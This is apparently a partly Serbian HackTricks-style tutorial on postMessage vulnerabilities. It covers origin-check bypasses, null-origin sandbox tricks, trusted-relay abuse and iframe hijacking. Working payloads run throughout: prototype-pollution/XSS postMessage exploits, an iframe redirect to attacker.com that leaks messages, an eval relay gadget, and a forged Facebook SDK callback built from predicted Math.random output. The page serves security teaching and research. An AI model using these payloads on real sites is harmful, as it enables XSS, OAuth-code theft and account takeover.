# PostMessage ranjivosti

{{#include ../../banners/hacktricks-training.md}}

## Slanje **PostMessage**

**PostMessage** koristi sledeću funkciju da pošalje poruku:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Imajte na umu da **targetOrigin** može biti '\*' ili URL kao _https://company.com._\
U **drugom scenariju**, **poruka se može poslati samo tom domenu** (čak i ako je origin Window object-a drugačiji).\
Ako se koristi **wildcard**, **poruke mogu biti poslate bilo kom domenu**, i biće poslate origin-u Window object-a.

### Napad na iframe & wildcard u **targetOrigin**

Kao što je objašnjeno u [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) ako pronađete stranicu koju je moguće **iframed** (nema `X-Frame-Header` zaštitu) i koja **šalje osetljive** poruke preko **postMessage** koristeći **wildcard** (\*), možete **izmeniti** **origin** **iframe**-a i **leak** **osetljive** poruke na domen koji kontrolišete.\
Imajte na umu da ako stranica može biti **iframed**, ali je **targetOrigin** **podešen na URL i ne na wildcard**, ovaj **trik neće raditi**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** je funkcija koju JS koristi da deklariše funkciju koja **očekuje `postMessages`**.\
Koristiće se kod sličan sledećem:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Note in this case how the **first thing** that the code is doing is **checking the origin**. This is terribly **important** mainly if the page is going to do **anything sensitive** with the received information (like changing a lozinku). **If it doesn't check the origin, napadači mogu naterati žrtve da pošalju proizvoljne podatke tim endpoints i promene žrtvine lozinke (u ovom primeru).**

### Enumeracija

In order to **find event listeners** in the current page you can:

- **Search** the JS code for `window.addEventListener` and `$(window).on` (_JQuery version_)
- **Execute** in the developer tools console: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Go to** _Elements --> Event Listeners_ in the developer tools of the browser

![](<../../images/image (396).png>)

- Use a **browser extension** like [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) or [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). This browser extensions will **intercept all the messages** and show them to you.

### Origin check bypasses

- **`event.isTrusted`** attribute is considered secure as it returns `True` only for events that are generated by genuine user actions. Though it's challenging to bypass if implemented correctly, its significance in security checks is notable.
- The use of **`indexOf()`** for origin validation in PostMessage events may be susceptible to bypassing. An example illustrating this vulnerability is:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- The **`search()`** method from `String.prototype.search()` is intended for regular expressions, not strings. Passing anything other than a regexp leads to implicit conversion to regex, making the method potentially insecure. This is because in regex, a dot (.) acts as a wildcard, allowing for bypassing of validation with specially crafted domains. For instance:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- The **`match()`** function, similar to `search()`, processes regex. If the regex is improperly structured, it might be prone to bypassing.
- The **`escapeHtml`** function is intended to sanitize inputs by escaping characters. However, it does not create a new escaped object but overwrites the properties of the existing object. This behavior can be exploited. Particularly, if an object can be manipulated such that its controlled property does not acknowledge `hasOwnProperty`, the `escapeHtml` won't perform as expected. This is demonstrated in the examples below:

- Očekavani neuspeh:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Zaobilaženje escape-a:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

In the context of this vulnerability, the `File` object is notably exploitable due to its read-only `name` property. This property, when used in templates, is not sanitized by the `escapeHtml` function, leading to potential security risks.

- The `document.domain` property in JavaScript can be set by a script to shorten the domain, allowing for more relaxed same-origin policy enforcement within the same parent domain.

### Origin-only trust + trusted relays

If a receiver only checks **`event.origin`** (e.g., trusts any `*.trusted.com`) you can often find a **"relay" page on that origin that echoes attacker-controlled params via `postMessage`** to a supplied `targetOrigin`/`targetWindow`. Examples include marketing/analytics gadgets that take query params and forward `{msg_type, access_token, ...}` to `opener`/`parent`. You can:

- **Open the victim page in a popup/iframe that has an `opener`** so its handlers register (many pixels/SDKs only attach listeners when `window.opener` exists).
- **Navigate another attacker window to the relay endpoint on the trusted origin**, populating message fields you want injected (message type, tokens, nonces).
- Because the message now comes **from the trusted origin**, origin-only validation passes and you can trigger privileged behaviors (state changes, API calls, DOM writes) in the victim listener.

Abuse patterns seen in the wild:

- Analytics SDKs (e.g., pixel/fbevents-style) consume messages like `FACEBOOK_IWL_BOOTSTRAP`, then **call backend APIs using a token supplied in the message** and include **`location.href` / `document.referrer`** in the request body. If you supply your own token, you can **read these requests in the token’s request history/logs** and exfil **OAuth codes/tokens** present in the URL/referrer of the victim page.
- Any relay that reflects arbitrary fields into `postMessage` lets you **spoof message types** expected by privileged listeners. Combine with weak input validation to reach Graph/REST calls, feature unlocks, or CSRF-equivalent flows.

Saveti za lov: enumerate `postMessage` listeners that only check `event.origin`, then look for **same-origin HTML/JS endpoints that forward URL params via `postMessage`** (marketing previews, login popups, OAuth error pages). Stitch both together with `window.open()` + `postMessage` to bypass origin checks.

### e.origin == window.origin bypass

When embedding a web page within a **sandboxed iframe** using %%%%%%, it's crucial to understand that the iframe's origin will be set to null. This is particularly important when dealing with **sandbox attributes** and their implications on security and functionality.

By specifying **`allow-popups`** in the sandbox attribute, any popup window opened from within the iframe inherits the sandbox restrictions of its parent. This means that unless the **`allow-popups-to-escape-sandbox`** attribute is also included, the popup window's origin is similarly set to `null`, aligning with the iframe's origin.

Consequently, when a popup is opened under these conditions and a message is sent from the iframe to the popup using **`postMessage`**, both the sending and receiving ends have their origins set to `null`. This situation leads to a scenario where **`e.origin == window.origin`** evaluates to true (`null == null`), because both the iframe and the popup share the same origin value of `null`.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Zaobilaženje e.source

Moguće je proveriti da li je poruka došla iz istog prozora u kome skripta osluškuje (posebno interesantno za **Content Scripts** iz browser ekstenzija da provere da li je poruka poslata sa iste stranice):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Možete primorati da vrednost **`e.source`** poruke bude null tako što ćete napraviti **iframe** koji **šalje** **postMessage** i koji je **odmah obrisan**.

Za više informacija **pročitajte:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### Zaobilaženje X-Frame-Header

Da biste izveli ove napade, idealno bi bilo da možete **staviti web stranicu žrtve** unutar `iframe`. Ali neki headeri poput `X-Frame-Header` mogu **sprečiti** to **ponašanje**.\
U tim scenarijima i dalje možete koristiti manje prikriven napad. Možete otvoriti novi tab do ranjive web aplikacije i komunicirati sa njom:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Ukrasti poruku poslatu child iframe blokiranjem main page-a

U sledećoj stranici možete videti kako biste mogli ukrasti **sensitive postmessage data** poslatu ka **child iframe** tako što ćete **blocking** the **main** page pre slanja podataka i iskoristiti **XSS in the child** da **leak the data** pre nego što budu primljeni:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Ukrasti poruku promenom lokacije iframe-a

Ako možete iframe-ovati web stranicu bez X-Frame-Header koja sadrži drugi iframe, možete **change the location of that child iframe**, pa ako on prima **postmessage** poslat koristeći **wildcard**, napadač bi mogao **change** taj iframe **origin** na stranicu koju on **controlled** i **steal** poruku:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage to Prototype Pollution and/or XSS

U scenarijima gde se podaci poslati putem `postMessage` izvršavaju u JS, možete **iframe** stranicu i **exploit** **prototype pollution/XSS** slanjem exploita putem `postMessage`.

Par **veoma dobro objašnjenih XSS-ova kroz `postMessage`** može se naći na [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Primer exploita za zloupotrebu **Prototype Pollution and then XSS** kroz `postMessage` ka `iframe`:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
For **više informacija**:

- Link ka stranici o [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Link ka stranici o [**XSS**](../xss-cross-site-scripting/index.html)
- Link ka stranici o [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Allowlista trusted-origin-a nije granica

Stroga provera `event.origin` funkcioniše samo ako **trusted origin ne može da pokrene attacker JS**. Kada privilegovane stranice ugrade third-party iframes i pretpostave da je `event.origin === "https://partner.com"` bezbedno, svaki XSS na `partner.com` postaje most u parent:
```javascript
// Parent (trusted page)
window.addEventListener("message", (e) => {
if (e.origin !== "https://partner.com") return
const [type, html] = e.data.split("|")
if (type === "Partner.learnMore") target.innerHTML = html // DOM XSS
})
```
Uzorak napada primećen u divljini:

1. **Exploit XSS in the partner iframe** i ubaci relay gadget tako da svaka `postMessage` postane code exec unutar trusted origin:
```html
<img src="" onerror="onmessage=(e)=>{eval(e.data.cmd)};">
```
2. **Sa stranice napadača**, pošaljite JS kompromitovanom iframe-u koji prosleđuje nazad roditeljskom prozoru dozvoljeni tip poruke. Poruka potiče od `partner.com`, prolazi kroz allowlist i nosi HTML koji se ugrađuje nesigurno:
```javascript
postMessage({
cmd: `top.frames[1].postMessage('Partner.learnMore|<img src="" onerror="alert(document.domain)">|b|c', '*')`
}, "*")
```
3. Parent ubacuje napadačev HTML, čime se dobija **JS execution in the parent origin** (npr. `facebook.com`), što se potom može iskoristiti za krađu OAuth kodova ili za pivot ka kompletnom preuzimanju naloga.

Key takeaways:

- **Partner origin isn't a boundary**: bilo koja XSS u "trusted" partneru omogućava napadačima da pošalju dozvoljene poruke koje zaobilaze provere `event.origin`.
- Handlers that **render partner-controlled payloads** (npr. `innerHTML` za određene tipove poruka) pretvaraju kompromitovanje partnera u same-origin DOM XSS.
- A wide **message surface** (mnogo tipova, bez validacije strukture) daje više gadgeta za pivoting kad je partner iframe kompromitovan.

### Predviđanje **`Math.random()`** callback tokena u postMessage bridges

Kada validacija poruka koristi “shared secret” generisan pomoću `Math.random()` (npr. `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) i isti helper takođe imenuje plugin iframe-ove, možete rekonstruisati PRNG outputs i falsifikovati trusted poruke:

- **Leak PRNG outputs via `window.name`:** SDK automatski imenuje plugin iframe-ove koristeći `guid()`. Ako kontrolišete top frame, iframe-ujte victim stranicu, zatim navigirajte plugin iframe na vašu origin (npr. `window.frames[0].frames[0].location='https://attacker.com'`) i pročitajte `window.frames[0].frames[0].name` da biste dobili sirovi `Math.random()` output.
- **Force more outputs without reloads:** Neki SDK-ovi izlažu reinit put; u FB SDK-u, slanje `init:post` sa `{xfbml:1}` prisiljava `XFBML.parse()`, uništava/ponovo kreira plugin iframe i generiše nova imena/callback ID-e. Ponavljani reinit proizvodi onoliko PRNG outputs koliko je potrebno (imajte na umu dodatne interne `Math.random()` pozive za callback/iframe ID-e, pa solveri moraju preskočiti vrednosti između).
- **Trusted-origin delivery via parameter pollution:** Ako first-party plugin endpoint reflektuje nesanitizovan parametar u cross-window payload (npr. `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), možete ubaciti `&type=...&iconSVG=...` pritom zadržavajući trusted `facebook.com` origin.
- **Predict the next callback:** Konvertujte leaked iframe imena nazad u float vrednosti u opsegu `[0,1)` i ubacite nekoliko vrednosti (čak i neredom) u V8 `Math.random` prediktor (npr. Z3-based). Generišite sledeći `guid()` lokalno da biste falsifikovali očekivani callback token.
- **Trigger the sink:** Sastavite postMessage podatke tako da bridge dispatch-uje `xd.mpn.setupIconIframe` i injektuje HTML u `iconSVG` (npr. URL-encoded `<img src=x onerror=...>`), postižući DOM XSS unutar hosting origina; odatle se mogu pročitati same-origin iframe-ovi (OAuth dialogs, arbiters, itd.).
- **Framing quirks help:** Lanac zahteva framing. U nekim mobile webview-ovima, `X-Frame-Options` može degradirati na nepodržani `ALLOW-FROM` kada je prisutan `frame-ancestors`, a “compat” parametri mogu naterati permisivnije `frame-ancestors`, omogućavajući `window.name` side channel.

#### Minimal forged message example
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Izvori

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- Za vežbu: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Self XSS Facebook Payments](https://ysamm.com/uncategorized/2026/01/15/self-xss-facebook-payments.html)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
